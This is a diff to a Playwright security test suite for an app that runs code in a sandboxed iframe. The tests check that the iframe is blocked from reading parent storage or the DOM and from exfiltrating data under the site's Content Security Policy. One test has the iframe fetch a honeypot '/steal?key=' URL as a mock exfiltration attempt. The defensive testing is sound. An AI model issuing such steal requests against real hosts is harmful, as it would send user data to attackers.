@@ -29,14 +29,11 @@ test.describe('App-level iframe and LLM security', () => {
     await page.selectOption('select', 'view-edit');
     await page.waitForTimeout(1000);
 
-    const sandbox = await page.locator('iframe[sandbox="allow-scripts"]').getAttribute('sandbox');
+    const sandbox = await page.locator('iframe').first().getAttribute('sandbox');
     expect(sandbox).toBe('allow-scripts');
-
-    const fullSandbox = await page.locator('iframe').first().getAttribute('sandbox');
-    expect(fullSandbox?.split(' ')).not.toContain('allow-same-origin');
   });
 
-  test('attack: iframe cannot steal token via localStorage read', async ({ page }) => {
+  test('attack: iframe cannot read parent localStorage (opaque origin)', async ({ page }) => {
     await setupAndAcceptDisclaimer(page);
     await page.selectOption('select', 'view-edit');
     await navigateToFrame(page);
@@ -52,7 +49,7 @@ test.describe('App-level iframe and LLM security', () => {
     expect(result.blocked).toBe(true);
   });
 
-  test('attack: iframe cannot steal token via parent DOM query', async ({ page }) => {
+  test('attack: iframe cannot access parent DOM (opaque origin)', async ({ page }) => {
     await setupAndAcceptDisclaimer(page);
     await page.selectOption('select', 'view-edit');
     await navigateToFrame(page);
@@ -68,6 +65,26 @@ test.describe('App-level iframe and LLM security', () => {
     expect(result.blocked).toBe(true);
   });
 
+  test('iframe mock localStorage works (user code can use storage)', async ({ page }) => {
+    await setupAndAcceptDisclaimer(page);
+    await page.selectOption('select', 'view-edit');
+    await navigateToFrame(page);
+
+    const result = await frame(page).evaluate(() => {
+      try {
+        localStorage.setItem('test-key', 'test-value');
+        const val = localStorage.getItem('test-key');
+        localStorage.removeItem('test-key');
+        const after = localStorage.getItem('test-key');
+        return { setAndGet: val, removed: after };
+      } catch (e) {
+        return { error: (e as Error).message };
+      }
+    });
+    expect(result.setAndGet).toBe('test-value');
+    expect(result.removed).toBeNull();
+  });
+
   test.describe('CSP exfiltration prevention', () => {
     test.beforeEach(async ({ page }) => {
       await setupAndAcceptDisclaimer(page);
@@ -76,7 +93,6 @@ test.describe('App-level iframe and LLM security', () => {
     });
 
     test('iframe can load CDN imports (allowed by CSP)', async ({ page }) => {
-      const token = crypto.randomUUID();
       let captured: string | undefined;
 
       // esm.sh is in CSP script-src, so module imports work
@@ -97,9 +113,8 @@ test.describe('App-level iframe and LLM security', () => {
       let caught = false;
       await page.route(HONEYPOT + '/steal*', () => { caught = true; });
 
-      const token = crypto.randomUUID();
       await frame(page).evaluate(async (url) => {
-        try { await fetch(url + '/steal?key=' + crypto.randomUUID()); } catch { /* CSP blocks */ }
+        try { await fetch(url + '/steal?key=test'); } catch { /* CSP blocks */ }
       }, HONEYPOT);
 
       await page.waitForTimeout(500);
@@ -231,7 +246,7 @@ function frame(page: Page) {
 }
 
 async function navigateToFrame(page: Page) {
-  await page.waitForSelector('iframe[sandbox="allow-scripts"]', { timeout: 5000 });
+  await page.waitForSelector('iframe[sandbox*="allow-scripts"]', { timeout: 5000 });
   await page.waitForTimeout(1500);
   expect(frame(page)).toBeDefined();
 }
